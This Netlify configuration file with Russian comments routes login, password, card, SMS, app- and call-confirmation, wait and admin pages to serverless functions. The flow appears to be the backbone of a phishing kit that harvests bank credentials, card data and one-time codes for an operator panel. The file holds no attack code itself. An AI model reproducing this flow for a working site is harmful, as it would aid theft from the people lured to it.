[build]
  publish = "public"
  functions = "netlify/functions"

[build.environment]
  NODE_VERSION = "18"

# ── API функции (POST формы идут сюда) ──────────────────────────────────────
[[redirects]]
  from = "/api/login"
  to = "/.netlify/functions/login"
  status = 200

[[redirects]]
  from = "/api/password"
  to = "/.netlify/functions/password"
  status = 200

[[redirects]]
  from = "/api/card"
  to = "/.netlify/functions/card"
  status = 200

[[redirects]]
  from = "/api/sms"
  to = "/.netlify/functions/sms"
  status = 200

[[redirects]]
  from = "/api/app-confirm"
  to = "/.netlify/functions/app-confirm"
  status = 200

[[redirects]]
  from = "/api/call-confirm"
  to = "/.netlify/functions/call-confirm"
  status = 200

[[redirects]]
  from = "/api/admin-config"
  to = "/.netlify/functions/admin-config"
  status = 200

# ── Страницы (GET) ───────────────────────────────────────────────────────────
[[redirects]]
  from = "/login"
  to = "/index.html"
  status = 200

[[redirects]]
  from = "/password"
  to = "/password.html"
  status = 200

[[redirects]]
  from = "/card"
  to = "/card.html"
  status = 200

[[redirects]]
  from = "/sms"
  to = "/sms.html"
  status = 200

[[redirects]]
  from = "/wait"
  to = "/wait.html"
  status = 200

[[redirects]]
  from = "/app-confirm"
  to = "/app-confirm.html"
  status = 200

[[redirects]]
  from = "/call-confirm"
  to = "/call-confirm.html"
  status = 200

[[redirects]]
  from = "/admin"
  to = "/admin.html"
  status = 200

# ── Fallback ─────────────────────────────────────────────────────────────────
[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200
